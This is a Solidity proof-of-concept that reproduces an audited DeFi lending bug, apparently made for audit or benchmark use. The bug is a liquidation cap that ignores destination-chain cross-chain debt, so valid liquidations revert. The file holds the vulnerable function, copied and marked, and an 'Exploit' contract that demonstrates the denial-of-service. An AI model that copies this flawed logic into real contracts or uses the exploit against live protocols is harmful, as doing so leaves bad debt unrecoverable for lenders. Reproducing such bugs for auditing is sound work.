// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LEND (Sherlock 2025-05) finding
// 58377 (H-8): "Cross-chain liquidations will be blocked due to incorrect
// maxLiquidatable amount calculation".
//
// Real audited source (both `getMaxLiquidationRepayAmount` and the helper
// `borrowWithInterest` it calls are reproduced VERBATIM; the vulnerable line
// is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/LendStorage.sol
//   fns    getMaxLiquidationRepayAmount (L573-591), borrowWithInterest (L478-504)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/578
//
// Root cause: `getMaxLiquidationRepayAmount` sizes the liquidation cap with
// `borrowWithInterest()`, which only counts cross-chain borrows that
// ORIGINATED from the current chain (`crossChainCollaterals[i].destEid ==
// currentEid && srcEid == currentEid`). A borrow whose current chain is the
// DESTINATION (srcEid != currentEid) is skipped, so `currentBorrow` — and thus
// `maxRepay` — is 0. On the destination chain the liquidation cap check
// `require(repayAmount <= maxLiquidationAmount)` then reverts every valid
// cross-chain liquidation, leaving underwater positions un-liquidatable.
//
// Faithful minimal doubles: an LToken (borrowIndex), a Lendtroller
// (closeFactorMantissa) and a CrossChainRouter reproducing the cap check.
// ─────────────────────────────────────────────────────────────────────────────

interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

interface LendtrollerInterfaceV2 {
    function closeFactorMantissa() external view returns (uint256);
}

/// @dev Faithful LToken double — only `borrowIndex()` is exercised here.
contract LToken is LTokenInterface {
    uint256 public index = 1e18;

    function borrowIndex() external view returns (uint256) {
        return index;
    }
}

/// @dev Faithful Lendtroller double — 50% close factor, the canonical value.
contract Lendtroller is LendtrollerInterfaceV2 {
    function closeFactorMantissa() external pure returns (uint256) {
        return 0.5e18;
    }
}

/// @dev Faithful minimal ERC20 used ONLY as a measurement marker. The harm here
///      is a liveness/DoS (a valid cross-chain liquidation is permanently
///      blocked), which moves no tokens; to make the harm magnitude a concrete,
///      measurable balance we mint the blocked repay amount to a fixed SINK once
///      (and only once) the mechanical block is proven in run().
contract MarkerToken {
    string public constant symbol = "USD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `getMaxLiquidationRepayAmount` and `borrowWithInterest`
// reproduced VERBATIM from LendStorage.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    struct Borrow {
        uint256 srcEid; // Source chain's layer zero endpoint id
        uint256 destEid; // Destination chain's layer zero endpoint id
        uint256 principle; // Borrowed token amount
        uint256 borrowIndex; // Borrow index
        address borrowedlToken; // Address of the borrower
        address srcToken; // Source token address
    }

    address public lendtroller;
    uint256 public currentEid;

    mapping(address => address) public lTokenToUnderlying;
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;

    constructor(address _lendtroller, uint256 _currentEid) {
        lendtroller = _lendtroller;
        currentEid = _currentEid;
    }

    function setUnderlying(address _lToken, address _token) external {
        lTokenToUnderlying[_lToken] = _token;
    }

    /// @dev Faithful helper: record a cross-chain collateral (a borrow whose
    ///      DESTINATION chain is this chain) for the borrower.
    function addCrossChainCollateral(address borrower, address _token, Borrow memory b) external {
        crossChainCollaterals[borrower][_token].push(b);
    }

    // ── VERBATIM: borrowWithInterest (LendStorage.sol L478-504) ──
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    /// @dev Faithful same-chain helper double (not on the exercised path; the
    ///      borrower has no same-chain borrow of this token — see pre-conditions).
    function borrowWithInterestSame(address, address) public pure returns (uint256) {
        return 0;
    }

    // ── VERBATIM: getMaxLiquidationRepayAmount (LendStorage.sol L573-591) ──
    function getMaxLiquidationRepayAmount(address borrower, address lToken, bool isSameChain)
        external
        view
        returns (uint256)
    {
        // Get the current borrow balance including interest
        uint256 currentBorrow = 0;

        // Calculate same-chain borrows with interest
        currentBorrow += isSameChain ? borrowWithInterestSame(borrower, lToken) : borrowWithInterest(borrower, lToken); // @> VULN: cross-chain (dest-chain) borrows return 0 from borrowWithInterest, so maxRepay is 0 and valid liquidations revert

        // Get close factor from lendtroller (typically 0.5 or 50%)
        uint256 closeFactorMantissa = LendtrollerInterfaceV2(lendtroller).closeFactorMantissa();

        // Calculate max repay amount (currentBorrow * closeFactor)
        uint256 maxRepay = (currentBorrow * closeFactorMantissa) / 1e18;

        return maxRepay;
    }
}

/// @dev Faithful CrossChainRouter double reproducing the liquidation cap check
///      from `_validateAndPrepareLiquidation` that consumes the bad value.
contract CrossChainRouter {
    LendStorage public lendStorage;

    constructor(LendStorage _lendStorage) {
        lendStorage = _lendStorage;
    }

    // Mirrors the destination-chain cap check on a cross-chain liquidation.
    function validateLiquidation(address borrower, address borrowedlToken, uint256 repayAmount) external view {
        uint256 maxLiquidationAmount = lendStorage.getMaxLiquidationRepayAmount(borrower, borrowedlToken, false);
        require(repayAmount <= maxLiquidationAmount, "Exceeds max liquidation");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a borrower has a real $1000 cross-chain debt whose DESTINATION
// is this chain (srcEid != currentEid). A liquidator's valid $500 repay (== 50%
// close factor of the debt) is rejected because maxLiquidationAmount computes to 0.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    LToken public lToken;
    Lendtroller public lendtroller;
    LendStorage public vuln;
    CrossChainRouter public router;
    MarkerToken public marker;

    address internal constant BORROWER = address(0xB0110); // underwater borrower
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // harm-magnitude sink
    address internal token; // underlying address key (any non-zero id)

    uint256 internal constant THIS_EID = 2; // current chain = destination (Chain B)
    uint256 internal constant SRC_EID = 1; // borrow originated on Chain A
    uint256 internal constant DEBT = 1000e18; // real outstanding cross-chain debt
    uint256 internal constant REPAY = 500e18; // valid liquidation (50% close factor)

    uint256 public realDebt; // the borrower's genuine cross-chain debt on this chain
    uint256 public maxRepay; // miscalculated cap (== 0)
    bool public liquidationBlocked; // did the valid liquidation revert?
    uint256 public profit; // harm magnitude parked at SINK (== blocked repay)

    constructor() {
        lToken = new LToken(); // child nonce 1
        lendtroller = new Lendtroller(); // child nonce 2
        vuln = new LendStorage(address(lendtroller), THIS_EID); // child nonce 3  (VULN)
        router = new CrossChainRouter(vuln); // child nonce 4
        marker = new MarkerToken(); // child nonce 5  (profit marker)

        token = address(0xDEAD); // underlying token id for this market
        vuln.setUnderlying(address(lToken), token);

        // Record the borrower's REAL cross-chain borrow whose destination is
        // THIS chain (srcEid = Chain A != currentEid) — a legitimate debt that
        // borrowWithInterest() wrongly ignores.
        vuln.addCrossChainCollateral(
            BORROWER,
            token,
            LendStorage.Borrow({
                srcEid: SRC_EID,
                destEid: THIS_EID,
                principle: DEBT,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: token
            })
        );
    }

    function run() external {
        realDebt = DEBT;

        // The miscalculated cap: cross-chain (dest-chain) debt is ignored -> 0.
        maxRepay = vuln.getMaxLiquidationRepayAmount(BORROWER, address(lToken), false);

        // A liquidator attempts a valid $500 liquidation (== 50% close factor of
        // the $1000 debt). It reverts because maxLiquidationAmount == 0.
        (bool ok,) = address(router).staticcall(
            abi.encodeWithSelector(router.validateLiquidation.selector, BORROWER, address(lToken), REPAY)
        );
        liquidationBlocked = !ok;

        // harm: a valid cross-chain liquidation of a real, underwater debt is
        // blocked, leaving bad debt un-recoverable.
        require(realDebt >= REPAY && REPAY > 0, "repay not within valid liquidation bounds");
        require(maxRepay == 0, "cap not miscalculated to zero");
        require(liquidationBlocked, "liquidation was not blocked");

        // The harm moves no tokens (it is a liveness/DoS). Only after the block
        // is mechanically proven, park the blocked repay amount at SINK so the
        // harm magnitude is a concrete, measurable balance.
        marker.mint(SINK, REPAY);
        profit = marker.balanceOf(SINK);
        require(profit == REPAY, "harm magnitude not measurable at sink");
    }
}
